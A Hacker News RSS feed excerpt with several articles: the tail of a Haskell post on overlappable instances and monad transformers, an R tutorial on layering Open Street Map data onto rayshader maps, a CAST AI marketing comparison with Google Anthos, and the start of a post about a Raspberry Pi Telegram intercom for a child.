  <span>log</span> <span>$</span> <span>"Inserted value: "</span> <span>&lt;&gt;</span> <span>show</span> <span>val1</span> <span>&lt;&gt;</span> <span>" under key: "</span> <span>&lt;&gt;</span> <span>key1</span>
  <span>maybeV</span> <span>&lt;-</span> <span>get</span> <span>key1</span>
  <span>case</span> <span>maybeV</span> <span>::</span> <span>Maybe</span> <span>Integer</span> <span>of</span>
    <span>Just</span> <span>val</span> <span>-&gt;</span> <span>log</span> <span>$</span> <span>"Retrieved: "</span> <span>&lt;&gt;</span> <span>show</span> <span>val</span>
    <span>Nothing</span> <span>-&gt;</span> <span>log</span> <span>"No data found"</span>
  <span>where</span>
    <span>key1</span> <span>::</span> <span>String</span>
    <span>key1</span> <span>=</span> <span>"key1"</span>
    <span>val1</span> <span>::</span> <span>Integer</span>
    <span>val1</span> <span>=</span> <span>1</span>

<span>----------------------------------------------------------------------------------------</span>
<span>newtype</span> <span>NoOpStoreT</span> <span>m</span> <span>a</span> <span>=</span> <span>NoOpStoreT</span> <span>{</span> <span>runNoOpStoreT</span> <span>::</span> <span>m</span> <span>a</span> <span>}</span>
  <span>deriving</span> <span>newtype</span> <span>(</span><span>Functor</span><span>,</span> <span>Applicative</span><span>,</span> <span>Monad</span><span>)</span>

<span>instance</span> <span>Monad</span> <span>m</span> <span>=&gt;</span> <span>Store</span> <span>(</span><span>NoOpStoreT</span> <span>m</span><span>)</span> <span>k</span> <span>v</span> <span>where</span>
  <span>put</span> <span>_</span> <span>_</span> <span>=</span> <span>pure</span> <span>()</span>
  <span>get</span> <span>_</span> <span>=</span> <span>pure</span> <span>Nothing</span>

<span>instance</span> <span>{-# OVERLAPPABLE #-}</span> <span>(</span><span>Store</span> <span>m</span> <span>k</span> <span>v</span><span>,</span> <span>MonadTrans</span> <span>t</span><span>,</span> <span>Monad</span> <span>m</span><span>)</span> <span>=&gt;</span> <span>Store</span> <span>(</span><span>t</span> <span>m</span><span>)</span> <span>k</span> <span>v</span> <span>where</span>
  <span>put</span> <span>a</span> <span>b</span> <span>=</span> <span>lift</span> <span>$</span> <span>put</span> <span>a</span> <span>b</span>
  <span>get</span> <span>a</span> <span>=</span> <span>lift</span> <span>$</span> <span>get</span> <span>a</span>

<span>instance</span> <span>MonadTrans</span> <span>NoOpStoreT</span> <span>where</span>
  <span>lift</span> <span>a</span> <span>=</span> <span>NoOpStoreT</span> <span>a</span>

<span>newtype</span> <span>StoreT</span> <span>m</span> <span>a</span> <span>=</span> <span>StoreT</span> <span>{</span> <span>runStoreT</span> <span>::</span> <span>m</span> <span>a</span> <span>}</span>
  <span>deriving</span> <span>newtype</span> <span>(</span><span>Functor</span><span>,</span> <span>Applicative</span><span>,</span> <span>Monad</span><span>,</span> <span>MonadIO</span><span>,</span> <span>MS</span><span>.</span><span>MonadState</span> <span>s</span><span>)</span>

<span>instance</span> <span>(</span><span>Ord</span> <span>k</span><span>,</span> <span>MS</span><span>.</span><span>MonadState</span> <span>(</span><span>Map</span> <span>k</span> <span>v</span><span>)</span> <span>m</span><span>,</span> <span>Monad</span> <span>m</span><span>)</span> <span>=&gt;</span> <span>Store</span> <span>(</span><span>StoreT</span> <span>m</span><span>)</span> <span>k</span> <span>v</span> <span>where</span>
  <span>put</span> <span>key</span> <span>value</span> <span>=</span> <span>MS</span><span>.</span><span>modify</span> <span>(</span><span>insert</span> <span>key</span> <span>value</span><span>)</span>
  <span>get</span> <span>key</span> <span>=</span> <span>fmap</span> <span>(</span><span>lookup</span> <span>key</span><span>)</span> <span>MS</span><span>.</span><span>get</span>

<span>instance</span> <span>MonadTrans</span> <span>StoreT</span> <span>where</span>
  <span>lift</span> <span>a</span> <span>=</span> <span>StoreT</span> <span>a</span>

<span>----------------------------------------------------------------------------------------</span>
<span>newtype</span> <span>NoOpLoggerT</span> <span>m</span> <span>a</span> <span>=</span> <span>NoOpLoggerT</span> <span>{</span> <span>runNoOpLoggerT</span> <span>::</span> <span>m</span> <span>a</span> <span>}</span>
  <span>deriving</span> <span>newtype</span> <span>(</span><span>Functor</span><span>,</span> <span>Applicative</span><span>,</span> <span>Monad</span><span>)</span>

<span>instance</span> <span>{-# OVERLAPPABLE #-}</span> <span>(</span><span>Logger</span> <span>m</span> <span>a</span><span>,</span> <span>MonadTrans</span> <span>t</span><span>,</span> <span>Monad</span> <span>m</span><span>)</span> <span>=&gt;</span> <span>Logger</span> <span>(</span><span>t</span> <span>m</span><span>)</span> <span>a</span> <span>where</span>
  <span>log</span> <span>a</span> <span>=</span> <span>lift</span> <span>$</span> <span>log</span> <span>a</span>

<span>instance</span> <span>MonadTrans</span> <span>NoOpLoggerT</span> <span>where</span>
  <span>lift</span> <span>a</span> <span>=</span> <span>NoOpLoggerT</span> <span>a</span>

<span>instance</span> <span>Monad</span> <span>m</span> <span>=&gt;</span> <span>Logger</span> <span>(</span><span>NoOpLoggerT</span> <span>m</span><span>)</span> <span>a</span> <span>where</span>
  <span>log</span> <span>_</span> <span>=</span> <span>pure</span> <span>()</span>

<span>newtype</span> <span>LoggerT</span> <span>m</span> <span>a</span> <span>=</span> <span>LoggerT</span> <span>{</span> <span>runLoggerT</span> <span>::</span> <span>m</span> <span>a</span> <span>}</span>
  <span>deriving</span> <span>newtype</span> <span>(</span><span>Functor</span><span>,</span> <span>Applicative</span><span>,</span> <span>Monad</span><span>,</span> <span>MonadIO</span><span>,</span> <span>MS</span><span>.</span><span>MonadState</span> <span>s</span><span>)</span>

<span>instance</span> <span>MonadTrans</span> <span>LoggerT</span> <span>where</span>
  <span>lift</span> <span>a</span> <span>=</span> <span>LoggerT</span> <span>a</span>

<span>instance</span> <span>(</span><span>Show</span> <span>a</span><span>,</span> <span>MonadIO</span> <span>m</span><span>)</span> <span>=&gt;</span> <span>Logger</span> <span>(</span><span>LoggerT</span> <span>m</span><span>)</span> <span>a</span> <span>where</span>
  <span>log</span> <span>msg</span> <span>=</span> <span>liftIO</span> <span>$</span> <span>putStrLn</span> <span>(</span><span>show</span> <span>msg</span><span>)</span>

<span>runMapStoreT</span> <span>=</span> <span>flip</span> <span>evalStateT</span> <span>(</span><span>empty</span> <span>::</span> <span>Map</span> <span>String</span> <span>Integer</span><span>)</span> <span>.</span> <span>runStoreT</span>

<span>main</span> <span>::</span> <span>IO</span> <span>()</span>
<span>main</span> <span>=</span> <span>do</span>
  <span>putStrLn</span> <span>"Running the program..."</span>
  <span>runMapStoreT</span> <span>.</span> <span>runLoggerT</span> <span>$</span> <span>program</span>
  <span>putStrLn</span> <span>"Done"</span>

</code></pre></div></div>
<p>Now we can do some more useful things with our program and stack transformers according to our needs.
Hope you enjoyed the read :-)</p>



  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://lukasz-golebiewski.github.io/haskell/effects/2021/01/06/overlappable-instances.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25672455</guid>
            <pubDate>Thu, 07 Jan 2021 15:58:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cartography in R with Rayshader and Open Street Map: A Tutorial]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25672197">thread link</a>) | @tylermw
<br/>
January 7, 2021 | https://www.tylermw.com/adding-open-street-map-data-to-rayshader-maps-in-r/ | <a href="https://web.archive.org/web/*/https://www.tylermw.com/adding-open-street-map-data-to-rayshader-maps-in-r/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
		<a href="#content">Skip to content</a>

	<div id="boxed-wrapper">
		
		<div id="wrapper">
			
			
				
			<header>
				
				
			</header>
							
				
		
				
				
			
			

						<main id="main">
				<div>

<section id="content">
	
					<article id="post-3287">
						
														
						
																									<div>
				





<meta charset="utf-8">
<meta name="generator" content="pandoc">
<meta http-equiv="X-UA-Compatible" content="IE=EDGE">


<meta name="author" content="Tyler Morgan-Wall">

<meta name="date" content="2020-12-27">

<title>osm</title>






<meta name="viewport" content="width=device-width, initial-scale=1">














<p><span>T</span>his post is a tutorial on how to add Open Street Map data to maps made with rayshader in R. Rayshader is a package for 2D and 3D visualization in R, specializing in generating beautiful maps using many various hillshading techniques (see these posts <a href="https://www.tylermw.com/making-beautiful-maps/">[1]</a> <a href="https://www.tylermw.com/a-step-by-step-guide-to-making-3d-maps-with-satellite-imagery-in-r/">[2]</a> <a href="https://www.tylermw.com/3d-maps-with-rayshader/">[3]</a>) directly from elevation data. It does this by providing the user with a wide variety of techniques: traditional lambertian shading, raytracing, ambient occlusion, hypsometric tinting (cartography-speak for mapping color to elevation), texture shading, and spherical aspect color shading.</p>
<div><img src="https://www.tylermw.com/wp-content/uploads/2021/01/examples-1.jpg"></div>
<center><div>Figure 1: Different hillshading methods. Left to right: Lambertian shading, raytracing, ambient occlusion, height shading, texture shading, sphere shading.</div></center>

<p>These techniques can be combined to create stunning maps in a few lines of R code, but that’s only half the story: a beautiful map is just a vehicle to deliver other information. Roads, trails, parking lots, water fountains, restrooms, the nearest Arbys: a map is a tool to build your mental model for a region. These features can be added to rayshader maps via data overlays: we first generate our base map using some combination of the above hillshading techniques, and then we layer our data on top. Rayshader provides you with functions to easily add polygons, lines, and points that represent your data directly onto your map.</p>
<div><img src="https://www.tylermw.com/wp-content/uploads/2021/01/generate_examples-1.jpg"></div>
<center><div>Figure 2: Adding polygon and line overlays to a map in 2D in rayshader.</div></center>
<p>You also need a source of data, and luckily we live in a universe where Open Street Map (OSM) exists: a free, open, user-generated map of pretty much everything in the world. If you have some highly specialized dataset, you might not be able to find it on OSM, but for the basics (trails, roads, rivers, streams, landmarks and buildings) it’s fairly comprehensive.</p>
<p>Knowing the data exists is only half the battle: you also need a way to load the data into R. And thankfully, Mark Padgham (along with many others and the rOpenSci project) have given us the <code>osmdata</code> package, a package that allows you to easily query and pull data from OSM in a few lines of code directly from R. You provide it with a lat/long bounding box and a specific feature you want to pull, and it will return an object containing everything that matches your query in that area.</p>



<p>Let’s jump into an example. We’ll use elevation data from Bryce Canyon in Utah (courtesy of Tom Patterson via <a href="http://shadedrelief.com/SampleElevationModels/">shadedrelief.com</a>), since National Parks tend to have a nice mix of interesting topography, trails, streams, and other features.</p>

<div><img src="https://www.tylermw.com/wp-content/uploads/2021/01/bryce.jpg"></div>
<center><div>Figure 3: A picture from a post-PhD defense trip I took to Bryce Canyon National Park in 2015. Remember travel?</div></center>
<p>Let’s start by loading the data and required packages. We’ll transform the spatial data structure extracted by raster into a regular R matrix using rayshader’s <code>raster_to_matrix()</code> function.</p>
<pre><code>install.packages("remotes")
remotes::install_github("tylermorganwall/rayshader")
remotes::install_github("tylermorganwall/rayimage")

library(rayshader)
library(raster)
library(osmdata)
library(sf)
library(dplyr)
library(ggplot2)

bryce = raster("Bryce_Canyon.tif")
bryce_mat = raster_to_matrix(bryce)</code></pre>
<p>We can also create a smaller version of this matrix for quick prototyping with the rayshader <code>resize_matrix()</code> function. This test matrix will be 1/4th the size of the full matrix.</p>
<pre><code>bryce_small = resize_matrix(bryce_mat,0.25)</code></pre>
<p>Now, let’s build our base map with rayshader. Let’s see what this data looks like with a basic color to elevation mapping.</p>
<pre><code>bryce_small %&gt;% 
  height_shade() %&gt;% 
  plot_map()</code></pre>
<div><img src="https://www.tylermw.com/wp-content/uploads/2021/01/initialplot-1.jpg" width="1608"></div>
<p>We’ll mix this layer with a spherical aspect shading color layer to enhance it using <code>sphere_shade()</code>.</p>
<pre><code>bryce_small %&gt;% 
  height_shade() %&gt;% 
  add_overlay(sphere_shade(bryce_small, texture = "desert", 
                           zscale=4, colorintensity = 5), alphalayer=0.5) %&gt;%
  plot_map()</code></pre>
<div><img src="https://www.tylermw.com/wp-content/uploads/2021/01/sphereplot-1.jpg" width="1608"></div>
<p>We can also overlay a standard hillshade to better define the terrain. We’ll get this by using the <code>lamb_shade()</code> function, which adds Lambertian (cosine) shading. The zscale parameter in `lamb_shade()` controls the amount of vertical exaggeration and thus the intensity of the hillshade.</p>
<pre><code>bryce_small %&gt;% 
  height_shade() %&gt;% 
  add_overlay(sphere_shade(bryce_small, texture = "desert", 
                           zscale=4, colorintensity = 5), alphalayer=0.5) %&gt;%
  add_shadow(lamb_shade(bryce_small,zscale = 6),0) %&gt;%
  plot_map()</code></pre>
<div><img src="https://www.tylermw.com/wp-content/uploads/2021/01/lambplot-1.jpg" width="1608"></div>
<p>Now we'll add a layer using the <code>texture_shade()</code> function, which adds shadows calculated by <a href="http://www.textureshading.com/Home.html">Leland Brown’s “texture shading” method</a>. This better defines ridges and drainage networks, which aren’t well-captured by Lambertian shading.</p>
<pre><code>bryce_small %&gt;% 
  height_shade() %&gt;% 
  add_overlay(sphere_shade(bryce_small, texture = "desert", 
                           zscale=4, colorintensity = 5), alphalayer=0.5) %&gt;%
  add_shadow(lamb_shade(bryce_small,zscale=6), 0) %&gt;%
  add_shadow(texture_shade(bryce_small,detail=8/10,contrast=9,brightness = 11), 0.1) %&gt;%
  plot_map()</code></pre>
<div><img src="https://www.tylermw.com/wp-content/uploads/2021/01/textureplot-1.jpg" width="1608"></div>
<p>Finally, we’ll add an ambient occlusion layer to our base map. This will darken valleys to account for less scattered atmospheric light reaching the valley floor. This adds a nice texture to our map, particularly to the valleys between the steep ridges.</p>
<pre><code>bryce_small %&gt;% 
  height_shade() %&gt;% 
  add_overlay(sphere_shade(bryce_small, texture = "desert", 
                           zscale=4, colorintensity = 5), alphalayer=0.5) %&gt;%
  add_shadow(lamb_shade(bryce_small,zscale=6), 0) %&gt;%
  add_shadow(ambient_shade(bryce_small), 0) %&gt;%
  add_shadow(texture_shade(bryce_small,detail=8/10,contrast=9,brightness = 11), 0.1) %&gt;%
  plot_map()</code></pre>
<div><img src="https://www.tylermw.com/wp-content/uploads/2021/01/ambientplot-1.jpg" width="1608"></div>
<p>Now we have our base map! We’ll zoom into our area of interest by creating a lat/long bounding box. To get these coordinates, I just went to Google Maps and picked the bottom left and top right corners, and pulled out the lat/long values. I wrote a short function that takes these values and transforms them into the coordinate system used in the original <code>bryce</code> object, which we then crop, convert to a matrix, and then plot. We’ll also save this map to a variable to use later, so we don’t have to recompute the base layer each time.</p>
<pre><code>lat_range   = c(37.614998, 37.629084)
long_range = c(-112.174228, -112.156230)

convert_coords = function(lat,long, from = CRS("+init=epsg:4326"), to) {
  data = data.frame(long=long, lat=lat)
  coordinates(data) &lt;- ~ long+lat
  proj4string(data) = from
  #Convert to coordinate system specified by EPSG code
  xy = data.frame(sp::spTransform(data, to))
  colnames(xy) = c("x","y")
  return(unlist(xy))
}

crs(bryce)</code></pre>
<pre><code>## CRS arguments:
##  +proj=utm +zone=12 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m
## +no_defs</code></pre>
<pre><code>utm_bbox = convert_coords(lat = lat_range, long=long_range, to = crs(bryce))
utm_bbox</code></pre>
<pre><code>##        x1        x2        y1        y2 
##  396367.4  397975.2 4163747.9 4165291.0</code></pre>
<pre><code>extent(bryce)</code></pre>
<pre><code>## class      : Extent 
## xmin       : 395998.5 
## xmax       : 399998.5 
## ymin       : 4161774 
## ymax       : 4165574</code></pre>
<pre><code>extent_zoomed = extent(utm_bbox[1], utm_bbox[2], utm_bbox[3], utm_bbox[4])
bryce_zoom = crop(bryce, extent_zoomed)
bryce_zoom_mat = raster_to_matrix(bryce_zoom)

base_map = bryce_zoom_mat %&gt;% 
  height_shade() %&gt;%
  add_overlay(sphere_shade(bryce_zoom_mat, texture = "desert", colorintensity = 5), alphalayer=0.5) %&gt;%
  add_shadow(lamb_shade(bryce_zoom_mat), 0) %&gt;%
  add_shadow(ambient_shade(bryce_zoom_mat),0) %&gt;% 
  add_shadow(texture_shade(bryce_zoom_mat,detail=8/10,contrast=9,brightness = 11), 0.1)

plot_map(base_map)</code></pre>
<div><img src="https://www.tylermw.com/wp-content/uploads/2021/01/osm_data-1.jpg" width="1608"></div>
<p>Great! We now have our zoomed-in base map. Let’s start adding OSM features to it.</p>
<p>You can see what features are available in OSM by calling the <code>available_features()</code> function. We’re first going to pull the <code>highway</code> feature in our region. Despite the name, <code>highway</code> represents more than major roads: it’s a feature that represents all types of roads and footpaths. We’ll build a query to the OSM Overpass API by passing in our lat/long bounding box (with a slight order change required for that API) to <code>opq()</code>, adding a feature with <code>add_osm_feature()</code>, and then convert the object to a simple features (sf) object with <code>osmdata_sf()</code>.</p>
<pre><code>osm_bbox = c(long_range[1],lat_range[1], long_range[2],lat_range[2])

bryce_highway = opq(osm_bbox) %&gt;% 
  add_osm_feature("highway") %&gt;% 
  osmdata_sf() 
bryce_highway</code></pre>
<pre><code>## Object of class 'osmdata' with:
##                  $bbox : 37.614998,-112.174228,37.629084,-112.15623
##         $overpass_call : The call submitted to the overpass API
##                  $meta : metadata including timestamp and version numbers
##            $osm_points : 'sf' Simple Features Collection with 2140 points
##             $osm_lines : 'sf' Simple Features Collection with 94 linestrings
##          $osm_polygons : 'sf' Simple Features Collection with 5 polygons
##        $osm_multilines : NULL
##     $osm_multipolygons : NULL</code></pre>
<p>This returns a list with several <code>sf</code> objects contained within: points, lines, and polygons. The data comes in lat/long coordinates, so we need to convert it to <code>bryce</code>’s coordinate system. Let’s plot the lines in ggplot to preview what data we have.</p>
<pre><code>bryce_lines = st_transform(bryce_highway$osm_lines, crs=crs(bryce))

ggplot(bryce_lines,aes(color=osm_id)) + 
  geom_sf() +
  theme(legend.position = "none") +
  labs(title = "Open Street Map `highway` attribute in Bryce Canyon National Park")</code></pre>

<p>Now, let’s add it to our map using rayshader’s <code>generate_line_overlay()</code> function, which takes an <code>sf</code> object with <code>LINESTRING</code> geometry and creates a semi-transparent overlay (which we then overlay with <code>add_overlay()</code>). You might notice that the above geometry extends far beyond the bounds of our scene, but that won’t matter—the <code>generate_*_overlay()</code> functions will crop the data down the region specified in <code>extent</code>.</p>
<pre><code>base_map %&gt;% 
  add_overlay(generate_line_overlay(bryce_lines,extent = extent_zoomed,</code></pre></div></article></section></div></main></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.tylermw.com/adding-open-street-map-data-to-rayshader-maps-in-r/">https://www.tylermw.com/adding-open-street-map-data-to-rayshader-maps-in-r/</a></em></p>]]>
            </description>
            <link>https://www.tylermw.com/adding-open-street-map-data-to-rayshader-maps-in-r/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25672197</guid>
            <pubDate>Thu, 07 Jan 2021 15:38:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Anthos vs. Cast AI Comparison: Who Wins?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25672035">thread link</a>) | @Cytergyny
<br/>
January 7, 2021 | https://resources.cast.ai/blog/google-anthos-vs-cast-ai-comparison | <a href="https://web.archive.org/web/*/https://resources.cast.ai/blog/google-anthos-vs-cast-ai-comparison">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div data-widget-type="blog_content" data-x="0" data-w="12">
<div>
    <div>
      <h6>
        
        
        
        
        
        3 min read
        
      </h6>
        

        <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>The idea that you can build an app in one place and then deploy it across multiple clouds is an enticing one. Th<span>at’s why multi-cloud solutions are on the rise today. They promise to help developers in expanding th</span><span>eir cloud portfolios and battle for the industry’s attention.</span></p>
<!--more-->
<p><img src="https://resources.cast.ai/hubfs/cast%20vs%20anthos-png.png">If you’re looking for the right m<span>anaged service that makes multi-cloud possible, we’ve got something for you. Here’s a detailed comparison of Google Anthos and CAST AI showing you two completely different multi-cloud approaches.&nbsp;</span></p>
<div><p>While Google Anthos uses a more complicated approach and you need to create a cluster for each cloud, CAST AI offers a more advanced way to solve this multi-cloud riddle - one cluster spread across multiple clouds.</p></div>
<h2>Google Anthos vs. CAST AI - feature comparison<p><img src="https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos1%20(1).png?width=750&amp;name=CAst_vs_anthos1%20(1).png" alt="CAst_vs_anthos1 (1)" width="750" srcset="https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos1%20(1).png?width=375&amp;name=CAst_vs_anthos1%20(1).png 375w, https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos1%20(1).png?width=750&amp;name=CAst_vs_anthos1%20(1).png 750w, https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos1%20(1).png?width=1125&amp;name=CAst_vs_anthos1%20(1).png 1125w, https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos1%20(1).png?width=1500&amp;name=CAst_vs_anthos1%20(1).png 1500w, https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos1%20(1).png?width=1875&amp;name=CAst_vs_anthos1%20(1).png 1875w, https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos1%20(1).png?width=2250&amp;name=CAst_vs_anthos1%20(1).png 2250w" sizes="(max-width: 750px) 100vw, 750px"></p></h2>
<h2>Google Anthos: one cluster on a single cloud, one tool for 3 clouds</h2>
<p>Anthos is Google’s new managed service offering for multi-cloud environments launched in 2019. Apart from access to multiple clouds, it offers hybrid cloud infrastructures or even a combination of on-premises and cloud-based functionalities.</p>
<p>Anthos is a meta-service that groups Kubernetes clusters by configuration and policy. Every cluster is independent - it has its own control plane, points of ingress, deployments, and configurations. This means that developers must continuously synchronize the clusters.&nbsp;</p>
<p>However, Anthos comes with cloud environments that are configured and may behave in a drastically different manner. While using Google, it offers a mostly streamlined experience. But try it on AWS or on-premises setup, and you’ll see that management is hard to automate. It requires ample knowledge of the destination cloud.</p>

<h2>CAST AI: one cluster on many clouds, unified multi-cloud for 3 clouds</h2>
<p>When you create a multi-cloud cluster with CAST AI, you get a single logical Kubernetes cluster connected across multiple cloud services. The solution creates a virtual multi-cloud private network using your VPN of choice or direct fiber connectivity between clouds.&nbsp;</p>
<p>CAST AI abstracts away the differences between compute, network, ingress and load balancing, and storage. As a result, you get an open and non-proprietary Kubernetes implementation for immediate production purposes.</p>
<h2><br><strong>What about cost optimization?</strong></h2>
<p><span><img src="https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos3-png.png?width=746&amp;name=CAst_vs_anthos3-png.png" width="746" srcset="https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos3-png.png?width=373&amp;name=CAst_vs_anthos3-png.png 373w, https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos3-png.png?width=746&amp;name=CAst_vs_anthos3-png.png 746w, https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos3-png.png?width=1119&amp;name=CAst_vs_anthos3-png.png 1119w, https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos3-png.png?width=1492&amp;name=CAst_vs_anthos3-png.png 1492w, https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos3-png.png?width=1865&amp;name=CAst_vs_anthos3-png.png 1865w, https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos3-png.png?width=2238&amp;name=CAst_vs_anthos3-png.png 2238w" sizes="(max-width: 746px) 100vw, 746px"></span></p>

<p>CAST AI has a heavy focus on optimization and cost of operation. Similar to GKE, CAST provides a set of out-of-the-box auto-scalers. Scaling a CAST AI cluster is controlled through customer defined policies. The CAST AI cost optimization engine focuses on ensuring that the best possible compute instances are used for currently deployed workloads. This includes the use of spot and preemptive instances when they are available to lower overall costs.</p>
<div><p>CAST AI’s multi-cloud solution does not require a special configuration management / synchronization service because of the One Cluster approach. Configurations are synchronized across clouds utilizing the underlying etcd data store that naturally supports multiple distributed master nodes.</p><p><img src="https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos2-png-1.png?width=748&amp;name=CAst_vs_anthos2-png-1.png" width="748" srcset="https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos2-png-1.png?width=374&amp;name=CAst_vs_anthos2-png-1.png 374w, https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos2-png-1.png?width=748&amp;name=CAst_vs_anthos2-png-1.png 748w, https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos2-png-1.png?width=1122&amp;name=CAst_vs_anthos2-png-1.png 1122w, https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos2-png-1.png?width=1496&amp;name=CAst_vs_anthos2-png-1.png 1496w, https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos2-png-1.png?width=1870&amp;name=CAst_vs_anthos2-png-1.png 1870w, https://resources.cast.ai/hs-fs/hubfs/CAst_vs_anthos2-png-1.png?width=2244&amp;name=CAst_vs_anthos2-png-1.png 2244w" sizes="(max-width: 748px) 100vw, 748px"></p></div>
<p>One cluster spread across multiple clouds is a more evolved approach to multi-cloud. Dealing with a single multi-cloud cluster is easier than having to constantly synchronize your clusters and only taking advantage of common configuration or policies.&nbsp;</p>
<p><span><span>Multi-cloud doesn’t have to be hard.</span> Explore your options and try out CAST AI </span><a href="https://console.cast.ai/signup?utm_source=internal&amp;utm_medium=blog&amp;utm_campaign=kubernetes_log_processing_4_challenges">here</a><span>.&nbsp;</span></p>
<p>We’re offering free cloud credentials to help you build your first multi-cloud clusters and play around with our infrastructure for a limited time. <a href="https://castai-community.slack.com/" rel="noopener">Just join our community on Slack.</a></p></span>
        </p>
        
            
        

        <div>
            <p><img alt="Leon Kuperman" src="https://f.hubspotusercontent00.net/hubfs/6978602/0.jpeg" data-src="https://f.hubspotusercontent00.net/hubfs/6978602/0.jpeg" data-srcset="https://f.hubspotusercontent00.net/hubfs/6978602/0.jpeg">
            </p>
            <div>
                <h4>Written by </h4>
                <p>Co-founder and CTO, CAST AI

Formerly Vice President of Security Products OCI at Oracle, Leon’s professional experience spans across tech companies such as IBM, Truition, and HostedPCI. He founded and served as the CTO of Zenedge, an enterprise security company protecting large enterprises with a cloud WAF. 

Leon has 20+ years of experience in product management, software design, and development, all the way through to production deployment. 

He is an authority on cloud computing, web application security and Payment Card Industry Data Security Standard (PCI DSS), e-commerce, and web application architecture. </p>
                
                    
                
            </div>
        </div>
        
        
    </div>
</div></div>

</div><!--end row-->
</div></div>]]>
            </description>
            <link>https://resources.cast.ai/blog/google-anthos-vs-cast-ai-comparison</link>
            <guid isPermaLink="false">hacker-news-small-sites-25672035</guid>
            <pubDate>Thu, 07 Jan 2021 15:21:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: I built an intercom for my 6 yo to keep us connected during quarantine]]>
            </title>
            <description>
<![CDATA[
Score 177 | Comments 122 (<a href="https://news.ycombinator.com/item?id=25671919">thread link</a>) | @daylankifky
<br/>
January 7, 2021 | https://chordata.cc/blog/open-source-intercom-for-kids/ | <a href="https://web.archive.org/web/*/https://chordata.cc/blog/open-source-intercom-for-kids/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<!-- .entry-container -->

			<div>
				
<pre><em>Today we’ll take a turn and showcase a personal project developed by our Tech Lead, Bruno, who took the multiple hours of lockdown we experienced last year and turned them into an initiative that allowed him to communicate with his 6 year old daughter. Below you’ll be able to review his experience and gather all of the details of his project (in case you want to replicate his system).</em></pre>



<p>In terms of social interactions, 2020 was an odd year, with cyclic lockdowns and openings. <strong>Keeping in touch with our close ones was one of the main challenges for all of us</strong>. The lockdowns are a bizarre experience in itself, but one of the strangest parts for me was when I topped it all up with a fever. It ended up being just a regular flu in the end, but for precaution my doctor ordered me to lock me down in a room for two weeks. Being there just a few meters away from my family and not being able to hug them or have a direct conversation was <strong>hard for all of us, but especially for my six-year-old daughter who wasn’t able to wrap her head around the reasons we couldn’t just see each other.</strong></p>



<p>So this time I decided to build something for her to keep us in touch in case something similar happens. The basic concept is a <strong>simplified interface for a Telegram voice chat with only a few (big) buttons: it should allow to easily and intuitively send and receive voice messages</strong>. Of course having a raspberry-pi as the core of this device was a no-brainer, since It has everything that’s needed for the project: WiFi connectivity, low level interface to control leds and buttons, and of course a complete OS where to run a Python interpreter to control everything.</p>



<div><figure><img src="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_blueprint-300x217.jpg" alt="" width="538" height="389" srcset="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_blueprint-300x217.jpg 300w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_blueprint-1024x739.jpg 1024w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_blueprint-768x555.jpg 768w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_blueprint-640x462.jpg 640w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_blueprint-100x72.jpg 100w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_blueprint.jpg 1108w" sizes="(max-width: 538px) 100vw, 538px"></figure></div>



<h3>TUI</h3>



<p>A good idea when dealing with electronic projects is to <strong>start small and have a proof of concept working before getting all the components</strong> and wire the whole thing together. In this case I started by creating the main program but replacing the physical button interface with a <em>TUI</em> (terminal user interface). The code can be found <a href="https://gitlab.com/daylanKifky/daddy-box-python-module" target="_blank" rel="noreferrer noopener">in this repository</a>, you should be able to test it by running it using the <code>--tui</code> flag like this:</p>



<pre>python -m daddy_box --tui</pre>



<div><figure><img src="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_tui.jpg" alt="" srcset="https://chordata.cc/wp-content/uploads/2021/01/daddy_box_tui.jpg 575w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_tui-300x242.jpg 300w, https://chordata.cc/wp-content/uploads/2021/01/daddy_box_tui-100x81.jpg 100w" sizes="(max-width: 575px) 100vw, 575px"></figure></div>



<h3>Telegram bot setup</h3>



